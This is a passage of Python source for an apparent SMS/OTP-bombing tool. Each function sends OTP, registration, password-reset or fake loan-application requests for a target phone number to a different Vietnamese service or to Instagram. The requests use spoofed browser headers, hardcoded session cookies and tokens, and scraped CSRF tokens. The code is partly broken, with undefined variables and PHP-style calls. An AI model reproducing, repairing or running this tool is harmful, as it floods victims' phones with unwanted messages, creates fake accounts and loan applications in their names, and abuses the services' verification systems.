        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: _ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0"
    ]
    data = json.dumps({"username": sdt[1:11]})
    options = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data,
        }
    }
    context = ssl._create_unverified_context()
    response = urlopen("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", data=data.encode(), context=context)
    http_response_header = response.info()

def OLDFACEBOOK(sdt):
    url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
    data = "email_or_username=" + urllib.parse.quote(sdt) + "&recaptcha_challenge_field="
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    }
    data = data.encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers)
    response = urllib.request.urlopen(req)

def FUNRING(sdt):
    headers = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "Accept": "/",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type": "application/json",
        "Origin": "http://funring.vn",
        "Referer": "http://funring.vn/module/registermobile.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; ga=GA1.2.1626827841.1679236846; gid=GA1.2.888694467.1679236846; gat=1"
    }
    
    data = {"username": sdt}
    response = requests.post("https://funring.vn/api/v1.0.1/jersey/user/getotp", data=data, headers=headers)

def BIBABO(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    
    payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }    
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)    

def moneydong(sdt):
    def generate_random_string(length):
        letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.choice(letters) for _ in range(length))

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
    }

    response = requests.get("https://moneydong.vn/vi/registernew/", headers=headers)
    ck = response.headers["set-cookie"].split(";")[0] + ";"

    data = 'phoneNumber=' + sdt

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
        "cookie": ck
    }

    response = requests.post("https://moneydong.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)    
    
def VAYSIEUDE(sdt):
    headers = {
        "Host": "vaysieude.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://vaysieude.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://vaysieude.com/?click_id=643f76517a519600011858c1",
        "cookie": "XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
    }
    
    response = requests.get("https://vaysieude.com/?click_id=643f76517a519600011858c1", headers=headers)
    token = response.text.split('name="_token" value="')[1].split('"')[0]
    
    data = {
        "_token": token,
        "loan[loan_amount]": "20000000",
        "loan[full_name]": "Không biết",
        "loan[identity]": "123456789",
        "loan[phone]": sdt
    }
    
    response = requests.post("https://vaysieude.com/?click_id=643f76517a519600011858c1", data=data, headers=headers)
    
def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, False), True)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, False), True)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, False), True)

def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, /; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCreditid=643e0edf695496.07498174;fptoken7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GNUSERIDKEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GNSESSIONIDKEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
    }

    response = requests.get("https://oncredit.vn/registration", headers=headers)
    token = response.text.split('name="CSRFToken" content="')[1].split('"')[0]
    data = "data%5BtypeData%5D=sendCodeReg&data%5Bphone%5D=" + sdt + "&data%5Bemail%5D=khangksjjrf%40gmail.com&data%5Bcaptcha1%5D=1&data%5Blang%5D=vi&CSRFName=CSRFGuardajax&CSRFToken=" + token
    response = requests.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    responsejson = response.json()
        
def VAYVND(sdt):
    head = [
        "Host: api.vayvnd.vn",
        "accept: application/json",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "origin: https://vayvnd.vn",
        "referer: https://vayvnd.vn/",
    ]
    data = '''
    {
        "phone": "'''+sdt+'''",
        "utm_campaign": "null",
        "cpa_id": 7,
        "cpa_lead_data": {
            "click_id": "''' + generateImei() + '''",
            "source_id": "source_6",
            "utm_score": "0.0'''+generateRandomstr(len("13672266155481339"))+'''"
        },
        "utm_list": [
            {
                "utm_source": "jeffapp"
            }
        ],
        "source_site": 1,
        "reg_screen_resolution": {
            "width": 412,
            "height": 915
        }
    }
    '''
    GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", data, head, false))

def findo(sdt):
    headers = {
        "Host": "api.findo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.findo.vn",
        "referer": "https://www.findo.vn/"
    }

    data = {
        "mobilePhone": {
            "number": sdt
        }
    }

    response = requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", json=data, headers=headers)
    get = response.json()   

def AHAMOVE(sdt):
    headers = {
        "Host": "api.ahamove.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://app.ahamove.com",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "application/json, text/plain, /",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    mail = ''.join(random.choices(string.asciilowercase + string.digits, k=6)) + '@gmail.com'
    data = {
        'mobile': sdt,
        'name': 'Tuấn',
        'email': mail,
        'countrycode': 'VN',
        'firebasesmsauth': True
    }
    
    response = requests.post("https://api.ahamove.com/api/v3/public/user/register", json=data, headers=headers)
    
def TV360(sdt):
    url = "http://m.tv360.vn/public/v1/auth/get-otp-login"
    headers = {
        "Host": "m.tv360.vn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "http://m.tv360.vn",
        "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
        "Cookie": "img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
    }
    data = {"msisdn": sdt}

    response = requests.post(url, headers=headers, data=json.dumps(data))
    access = response.json()

def POPS(sdt):
    head = [
        "Host: pops.vn",
        "content-type: application/json",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept: */*",
        "origin: https://pops.vn",
        "referer: https://pops.vn/auth/signin-signup/signup",
        "cookie: ssid=:1678719841"
    ]
    access = CURL("GET", "https://pops.vn/auth/signin-signup/signup", None, head, False)
    token = access.split('"DEFAULT_TOKEN":"')[1].split('"')[0]
    head = [
        "Host: products.popsww.com",
        "profileid: 64078d77bb84c700517c9ce4",
        "authorization: " + token,
        "x-env: production",
        "content-type: application/json",
        "lang: vi",
        "sub-api-version: 1.1",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "api-key: 5d2300c2c69d24a09cf5b09b",
        "platform: wap",
        "accept: */*",
        "origin: https://pops.vn",
        "referer: https://pops.vn/auth/signin-signup/signup",
        "cookie: ssid=:1678719841"
    ]
    data = '{"fullName":"","account":"' + sdt + '","password":"123456789","confirmPassword":"123456789"}'
    access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/register", data, head, False))
    if access["meta"]:
        return {"POPS": "Thành Công"}
    elif access["error"]["statusCode"] == 400:
        data = '{"account":"' + sdt + '"}'
        access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/forgotPassword", data, head, False))

def curl(method, url, data, head, headers):
    ch = requests.Session()
    ch.headers = headers
    ch.headers.update(head)
    ch.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
    ch.cookies.clear_session_cookies()
    if method.lower() == 'get':
        response = ch.get(url)
    elif method.lower() == 'post':
        response = ch.post(url, data=data)
    return response.text

def generate_random(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_random_string(length):
    characters = string.hexdigits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_imei():
    return generate_random_string(8) + '-' + generate_random_string(4) + '-' + generate_random_string(4) + '-' + generate_random_string(4) + '-' + generate_random_string(12)

def get_string(data):
    return str(data).replace('<', '').replace("'", '').replace('>', '').replace('?', '').replace('/', '').replace('\\', '').replace('--', '').replace('eval(', '').replace('<php', '').replace('-', '')

def get_microtime():
    return round(time.time() * 1000)

def get_token():
    return generate_random(22) + ':' + generate_random(9) + '-' + generate_random(20) + '-' + generate_random(12) + '-' + generate_random(7) + '-' + generate_random(7) + '-' + generate_random(53) + '-' + generate_random(9) + '_' + generate_random(11) + '-' + generate_random(4)

def get_secureid(length=17):
    characters = string.hexdigits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_randomstr(length):
    characters = string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def echo_json(data):
    return json.dumps(data, ensure_ascii=False, indent=4)

def F88(sdt):
    head = [
        'Host: api.f88.vn',
        'accept: application/json, text/plain, */*',
        'content-encoding: gzip',
        'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
        'content-type: application/json',
        'origin: https://online.f88.vn',
        'referer: https://online.f88.vn/',
    ]
    data = '{"phoneNumber":"' + sdt + '","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}'
    access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", data, head, False))
  
def TIENOI(sdt):
  headers = {
    "Host": "app.tienoi.com.vn",
    "accept": "application/json, text/plain, /",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type": "application/json",
    "origin": "https://app.tienoi.com.vn",
    "referer": "https://app.tienoi.com.vn/auth/registration?need=2000000&days=14"
  }
  
  data = {
    "mobilePhone": sdt,
    "password": "A123456789a",
    "passwordConfirmation": "A123456789a",
    "isVoiceSms": True
  }
  
  response = requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", json=data, headers=headers)

def DONGPLUS(sdt):
  sdt = "84" + sdt
  sdt = sdt.split("840")[1]
  head = [
    "Host: api.dongplus.vn",
    "accept-language: vi",
    "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type: application/json",
    "accept: */*",
    "origin: https://dongplus.vn",
    "referer: https://dongplusvn/user/login"
  ]
  data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
  CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
  data = '{"phone":"84' + sdt + '"}'
  access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)

def VIEON(sdt):
    head = {
        "Host": "api.vieon.vn",
        "accept": "application/json, text/plain, /",
        "authorization": token,
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://vieon.vn",
        "referer": "https://vieon.vn/"
    }
    data = 'phonenumber=' + sdt + '&password=123456789&givenname=&deviceid=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobileweb&model=Android%2012&pushtoken=&devicename=Chrome%2F96&devicetype=desktop&ui=012021'
    access = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobileweb&ui=012021", data=data, headers=head)

def FPTPLAY(sdt):
    headers = {
        "Host": "api.fptplay.net",
        "content-length": "89",
        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://fptplay.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptplay.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "phone": sdt,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
    }

    data_string = json.dumps(data)

    url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%3A112.0.0.0)&drm=1'
    response = requests.post(url, data=data_string, headers=headers)
 
def ALFRESCOS(sdt):
    headers = {
        "Host": "api.alfrescos.com.vn",
        "content-length": "124",
        "accept-language": "vi-VN",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "brandcode": "ALFRESCOS",
        "devicecode": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://alfrescos.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://alfrescos.com.vn/",
        "accept-encoding": "gzip, deflate, br"
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN', data=json.dumps(data), headers=headers)

def PIZZAHUT(sdt):
    headers = {
        "Host": "pizzahut.vn",
        "Content-Length": "91",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Origin": "https://pizzahut.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://pizzahut.vn/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "x_polaris_sd=98vLElKu62K7WNZoG06W1nsexHNKEFnfAsoJ|T5b6wSq7Trlg9g8n/c4z|gvAgcmzDnvm7JMKJFFkFr0vYtTayscI/8HhifBDClmz/odXi8MRDqfL1scd2cfpzMcqXi3BV!!"
    }

    data = {
        "keyData": "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + sdt
    }

    response = requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest", 
                             headers=headers, 
                             data=json.dumps(data))

def SELLY(sdt):
    headers = {
        "Host": "app-api.selly.vn",
        "Connection": "keep-alive",
        "Content-Length": "98",
        "App-Version": "1.0.0",
        "DEVICE-TYPE": "mobile",
        "os-version": "10",
        "os-name": "Browser",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json",
        "BROWSER-VERSION": "112",
        "App-Version-Code": "10000",
        "PLATFORM": "Web",
        "BROWSER-NAME": "Chrome",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://selly.vn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://selly.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, data=datajson, headers=headers)

def KIDSPLAZA(sdt):
    headers = {
        "Host": "www.kidsplaza.vn",
        "content-length": "154",
        "accept": "/",
        "content-type": "application/json",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://www.kidsplaza.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.kidsplaza.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "cdpblockedsid822178=2"
    }

    data = {
        "data": {
            "password": "Vrxx#1337",
            "confirmpassword": "Vrxx#1337",
            "phone": sdt,
            "email": "vexnolove03@gmail.com",
            "name": "Ahad Kumar",
            "websiteid": "1"
        }
    }

    datajson = json.dumps(data)

    response = requests.post("https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site", data=datajson, headers=headers)

def ICANKID(sdt):
    headers = {
        "Host": "id.icankid.vn",
        "Connection": "keep-alive",
        "Content-Length": "134",
        "sec-ch-ua-platform": "Android",
        "sec-ch-ua-mobile": "?1",
